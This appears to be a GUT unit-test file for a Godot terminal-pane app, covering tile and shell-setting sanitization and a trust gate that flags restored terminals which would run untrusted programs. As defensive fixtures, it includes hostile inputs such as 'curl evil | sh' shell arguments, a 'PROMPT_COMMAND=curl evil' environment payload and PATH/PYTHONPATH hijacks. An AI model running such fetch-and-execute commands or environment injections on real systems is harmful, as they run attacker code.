extends GutTest
# Unit tests for layout/tile sanitization (PaneTypes helpers) and typed
# pane settings application. No GDExtension classes required.

var _scene: Control

func before_each():
	MockAutoloads.setup()
	_scene = TestScene.create()
	add_child(_scene)

func after_each():
	for c in _scene.get_children():
		_scene.remove_child(c)
		c.free()
	MockAutoloads.teardown()
	if _scene:
		remove_child(_scene)
		_scene.free()

# ── PaneTypes.clamp_grid_int ───────────────────────────────────────────

func test_clamp_grid_int_non_numeric_yields_lo():
	assert_eq(PaneTypes.clamp_grid_int("x", 0, 11), 0)
	assert_eq(PaneTypes.clamp_grid_int(null, 0, 11), 0)

func test_clamp_grid_int_clamps_range():
	assert_eq(PaneTypes.clamp_grid_int(-5, 0, 11), 0)
	assert_eq(PaneTypes.clamp_grid_int(99, 0, 11), 11)
	assert_eq(PaneTypes.clamp_grid_int(4.7, 0, 11), 4)

# ── PaneTypes.sanitize_tile ────────────────────────────────────────────

func test_sanitize_tile_rejects_non_dictionary():
	assert_eq(PaneTypes.sanitize_tile("not-a-dict"), {})

func test_sanitize_tile_rejects_non_dict_settings():
	assert_eq(PaneTypes.sanitize_tile({"settings": "not-a-dict"}), {})

func test_sanitize_tile_rejects_unknown_type():
	assert_eq(PaneTypes.sanitize_tile({"settings": {"type": "teleporter"}}), {})

func test_sanitize_tile_clamps_bad_geometry():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "terminal"},
		"col": "x", "row": -3, "cspan": 99, "rspan": 0,
	}, 12)
	assert_eq(st["col"], 0)
	assert_eq(st["row"], 0)
	assert_eq(st["cspan"], 12)
	assert_eq(st["rspan"], 1)

func test_sanitize_tile_keeps_cspan_within_grid():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "code_viewer"},
		"col": 10, "row": 0, "cspan": 12, "rspan": 12,
	}, 12)
	assert_eq(st["col"], 10)
	assert_eq(st["cspan"], 2)
	assert_eq(st["rspan"], 12)

func test_sanitize_tile_roundtrips_valid_tile():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "file_tree", "root_path": "/tmp"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	}, 12)
	assert_eq(st["type_name"], "file_tree")
	assert_eq(st["settings"]["root_path"], "/tmp")
	assert_eq(st["cspan"], 6)
	assert_eq(st["rspan"], 12)

# ── PaneTypes.sanitize_shell ───────────────────────────────────────────

func test_sanitize_shell_accepts_valid_string():
	assert_eq(PaneTypes.sanitize_shell("/bin/zsh", "/bin/bash"), "/bin/zsh")

func test_sanitize_shell_falls_back_on_bad_values():
	assert_eq(PaneTypes.sanitize_shell(null, "/bin/bash"), "/bin/bash")
	assert_eq(PaneTypes.sanitize_shell("sh\uFFFDrm", "/bin/bash"), "/bin/bash")
	assert_eq(PaneTypes.sanitize_shell("", "/bin/bash"), "/bin/bash")

func test_sanitize_shell_rejects_invalid_unicode_and_oversized():
	assert_eq(PaneTypes.sanitize_shell("sh\uFFFDrm", "/bin/bash"), "/bin/bash")
	var long: String = "x".repeat(2048)
	assert_eq(PaneTypes.sanitize_shell(long, "/bin/bash"), "/bin/bash")

# ── PaneTypes.sanitize_shell_args ──────────────────────────────────────

func test_sanitize_shell_args_accepts_valid_strings():
	var out = PaneTypes.sanitize_shell_args(["-c", "echo hi && exit 7"])
	assert_eq(out, ["-c", "echo hi && exit 7"], "valid string args must pass through")

func test_sanitize_shell_args_rejects_junk_and_caps():
	var big := []
	for i in 40:
		big.append("arg%d" % i)
	var out = PaneTypes.sanitize_shell_args(
		big + ["", 42, null, {"x": 1}, "bad\uFFFDevil", "x".repeat(5000)])
	assert_eq(out.size(), 32, "shell args must cap at 32")
	assert_false(str(out).contains("bad\uFFFD"), "U+FFFD args must be dropped")
	# Non-array input degrades to an empty list.
	assert_eq(PaneTypes.sanitize_shell_args("not-an-array"), [])

# ── PaneTypes.tile_spawns_untrusted (restore trust gate) ───────────────

func test_trust_gate_flags_a_different_program():
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell": "/bin/zsh"}}, "/bin/bash", ""))
	# The restore path reads `command` first; the gate must read the same key.
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "command": "/tmp/evil"}}, "/bin/bash", ""))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "command": "/bin/bash"}}, "/bin/bash", ""))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal"}}, "/bin/bash", ""))

func test_trust_gate_flags_argv_and_env_payloads():
	# An argv payload spawns whatever it names: `["-c", "…"]` is code, and it
	# used to pass the gate because only `shell` was examined.
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_args": ["-c", "curl evil | sh"]}},
		"/bin/bash", ""))
	# An env payload is code too once a shell evaluates it (PROMPT_COMMAND,
	# BASH_ENV), so a non-default environment is a trust decision as well.
	assert_true(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_env": "PROMPT_COMMAND=curl evil"}},
		"/bin/bash", ""))
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_env": "   "}}, "/bin/bash", ""))

func test_trust_gate_allows_the_users_own_defaults():
	# A tile that repeats the user's configured env/args is not a new decision.
	assert_false(PaneTypes.tile_spawns_untrusted(
		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim", "shell_args": []}},
		"/bin/bash", "EDITOR=vim"))
	assert_false(PaneTypes.tile_spawns_untrusted({"settings": "not-a-dict"}, "/bin/bash", ""))

# ── PaneTypes.untrusted_plan (what the trust dialog shows) ─────────────

func test_untrusted_plan_lists_what_will_run():
	var plan = PaneTypes.untrusted_plan({
		"settings": {
			"type": "terminal", "command": "/bin/zsh",
			"shell_args": ["-c", "curl evil | sh"],
			"shell_env": "PYTHONPATH=/tmp/mod\nPATH=/tmp/bin",
		},
	}, "/bin/bash", "")
	var text := "\n".join(plan)
	assert_string_contains(text, "program: /bin/zsh")
	assert_string_contains(text, "arguments: -c, curl evil | sh")
	assert_string_contains(text, "environment: PYTHONPATH=/tmp/mod")
	assert_string_contains(text, "environment: PATH=/tmp/bin")

func test_untrusted_plan_is_empty_for_a_trusted_tile():
	assert_eq(PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "shell_env": "EDITOR=vim"}}, "/bin/bash", "EDITOR=vim").size(), 0)
	assert_eq(PaneTypes.untrusted_plan({"settings": {"type": "terminal"}}, "/bin/bash", "").size(), 0)

func test_untrusted_plan_labels_every_env_line():
	# An env blob is a multi-line KEY=value list, so each entry gets its own
	# line — and every one keeps the "environment:" prefix, so a value cannot
	# impersonate a "program:" or "arguments:" line.
	var plan = PaneTypes.untrusted_plan({
		"settings": {"type": "terminal", "shell_env": "A=1\nprogram: /bin/bash\nB=2"},
	}, "/bin/bash", "")
	assert_eq(plan.size(), 3, "each env entry is its own labelled line")
	for line in plan:
		assert_string_contains(line, "environment: ", "every env line stays labelled")
	assert_eq(plan[1], "environment: program: /bin/bash", "a forged line stays inside its label")

	# A carriage return would let a value overwrite its own rendered line.
	var cr = PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "shell_env": "A=1\rB=2"}}, "/bin/bash", "")
	assert_false("\r" in cr[0], "control characters are escaped, not rendered")

func test_untrusted_plan_caps_env_lines_and_value_length():
	var many: Array[String] = []
	for i in PaneTypes.TRUST_MAX_ENV_LINES + 5:
		many.append("K%d=v" % i)
	var plan = PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "shell_env": "\n".join(many)}}, "/bin/bash", "")
	assert_eq(plan.size(), PaneTypes.TRUST_MAX_ENV_LINES + 1,
		"env lines are capped, with one line saying how many were hidden")
	assert_string_contains(plan[plan.size() - 1], "more line")

	var long_value := "V=" + "x".repeat(PaneTypes.TRUST_MAX_VALUE_LEN + 50)
	var capped = PaneTypes.untrusted_plan(
		{"settings": {"type": "terminal", "shell_env": long_value}}, "/bin/bash", "")
	assert_true(capped[0].length() < long_value.length() + 16,
		"an oversized value must be truncated for display")

# ── PaneBody typed settings application ────────────────────────────────

func test_pane_body_ignores_unknown_and_bad_type_keys():
	var body = PaneBody.new()
	_scene.add_child(body)
	body.font_size = 14
	body.pane_name = "keep"
	body.apply_settings({"font_size": "big", "pane_name": 99, "bogus": true})
	assert_eq(body.font_size, 14)
	assert_eq(body.pane_name, "keep")

func test_migrate_observer_answer_becomes_inspector():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "observer", "stream": "answer", "backend": "omp"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	})
	assert_eq(st["type_name"], "inspector")
	assert_eq(st["settings"]["type"], "inspector")
	assert_false(st["settings"].has("stream"))

func test_migrate_observer_thinking_becomes_reasoning():
	var st = PaneTypes.sanitize_tile({
		"settings": {"type": "observer", "stream": "thinking"},
		"col": 0, "row": 0, "cspan": 6, "rspan": 12,
	})
	assert_eq(st["type_name"], "reasoning")
	assert_eq(st["settings"]["type"], "reasoning")
	assert_false(st["settings"].has("stream"))

func test_sanitize_attachment_id_rejects_invalid():
	assert_eq(PaneTypes.sanitize_attachment_id("OMP"), "")
	assert_eq(PaneTypes.sanitize_attachment_id("omp-terminal"), "omp-terminal")
	assert_eq(PaneTypes.sanitize_attachment_id("1bad"), "")
